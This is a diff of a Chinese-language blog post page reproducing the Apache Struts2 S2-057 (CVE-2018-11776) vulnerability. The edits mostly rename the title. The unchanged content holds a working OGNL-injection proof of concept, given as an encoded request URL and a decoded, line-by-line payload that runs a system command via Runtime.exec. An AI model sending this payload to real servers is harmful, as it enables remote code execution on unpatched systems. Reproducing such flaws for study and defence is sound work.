@@ -92,15 +92,15 @@
 <meta name="description" content="恩 我还在等一个人 等一个让九月的风变暖的人这两天看到St2-057漏洞挺火的，他是一个远程代码执行的高危漏洞，编号为CVE-2018-11776，当然在实际场景中存在一定局限性，需要满足一定条件。">
 <meta name="keywords" content="Struts2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="s2-057复现">
-<meta property="og:url" content="http://smelond.com/2018/08/27/s2-057复现/index.html">
+<meta property="og:title" content="s2-057漏洞复现">
+<meta property="og:url" content="http://smelond.com/2018/08/27/s2-057漏洞复现/index.html">
 <meta property="og:site_name" content="smelond&#39;s Blog">
 <meta property="og:description" content="恩 我还在等一个人 等一个让九月的风变暖的人这两天看到St2-057漏洞挺火的，他是一个远程代码执行的高危漏洞，编号为CVE-2018-11776，当然在实际场景中存在一定局限性，需要满足一定条件。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://smelond.com/image_upload/2018/08/20180827170729.png">
-<meta property="og:updated_time" content="2018-08-27T10:42:52.135Z">
+<meta property="og:updated_time" content="2018-08-27T10:46:50.818Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="s2-057复现">
+<meta name="twitter:title" content="s2-057漏洞复现">
 <meta name="twitter:description" content="恩 我还在等一个人 等一个让九月的风变暖的人这两天看到St2-057漏洞挺火的，他是一个远程代码执行的高危漏洞，编号为CVE-2018-11776，当然在实际场景中存在一定局限性，需要满足一定条件。">
 <meta name="twitter:image" content="http://smelond.com/image_upload/2018/08/20180827170729.png">
 
@@ -132,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://smelond.com/2018/08/27/s2-057复现/"/>
+  <link rel="canonical" href="http://smelond.com/2018/08/27/s2-057漏洞复现/"/>
 
 
 
 
 
-  <title>s2-057复现 | smelond's Blog</title>
+  <title>s2-057漏洞复现 | smelond's Blog</title>
   
 
 
@@ -319,7 +319,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://smelond.com/2018/08/27/s2-057复现/">
+    <link itemprop="mainEntityOfPage" href="http://smelond.com/2018/08/27/s2-057漏洞复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="smelond">
@@ -336,7 +336,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">s2-057复现</h1>
+          <h1 class="post-title" itemprop="name headline">s2-057漏洞复现</h1>
         
 
         <div class="post-meta">
@@ -388,7 +388,7 @@
 
           
           
-             <span id="/2018/08/27/s2-057复现/" class="leancloud_visitors" data-flag-title="s2-057复现">
+             <span id="/2018/08/27/s2-057漏洞复现/" class="leancloud_visitors" data-flag-title="s2-057漏洞复现">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -442,6 +442,7 @@
 <p>弹计算器poc（感谢jas502n大佬提供）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/struts2-showcase/%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().<span class="built_in">exec</span>(%27calc%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew++java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b51020%5d%2c%23c.read(%23d)%2c%23jas502n%3d+%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23jas502n.println(%23d+)%2c%23jas502n.close())%7d/actionChain1.action</span><br></pre></td></tr></table></figure></p>
 <p>poc-example:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new  java.io.BufferedReader(#b),#d=new char[51020],#c.read(#d),#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),#jas502n.println(#d ),#jas502n.close())&#125;</span><br></pre></td></tr></table></figure></p>
 <p>拆分<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(</span><br><span class="line">#_memberAccess["allowStaticMethodAccess"]=true,</span><br><span class="line">#a=@java.lang.Runtime@getRuntime().exec('calc').getInputStream(),</span><br><span class="line">#b=new java.io.InputStreamReader(#a),</span><br><span class="line">#c=new java.io.BufferedReader(#b),</span><br><span class="line">#d=new char[51020],</span><br><span class="line">#c.read(#d),</span><br><span class="line">#jas502n= @org.apache.struts2.ServletActionContext@getResponse().getWriter(),</span><br><span class="line">#jas502n.println(#d),</span><br><span class="line">#jas502n.close())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<hr>
 <p>参考：<br><a href="https://github.com/jas502n/St2-057" target="_blank" rel="noopener">https://github.com/jas502n/St2-057</a><br><a href="https://www.anquanke.com/post/id/157518" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157518</a><br><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></p>
 
       
@@ -459,12 +460,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/2018/08/27/s2-057复现/">s2-057复现</a></p>
+  <p><span>本文标题:</span><a href="/2018/08/27/s2-057漏洞复现/">s2-057漏洞复现</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 smelond 的个人博客">smelond</a></p>
   <p><span>发布时间:</span>2018年08月27日 - 18:08</p>
   <p><span>最后更新:</span>2018年08月27日 - 18:08</p>
-  <p><span>原始链接:</span><a href="/2018/08/27/s2-057复现/" title="s2-057复现">http://smelond.com/2018/08/27/s2-057复现/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://smelond.com/2018/08/27/s2-057复现/"  aria-label="复制成功！"></i></span>
+  <p><span>原始链接:</span><a href="/2018/08/27/s2-057漏洞复现/" title="s2-057漏洞复现">http://smelond.com/2018/08/27/s2-057漏洞复现/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://smelond.com/2018/08/27/s2-057漏洞复现/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
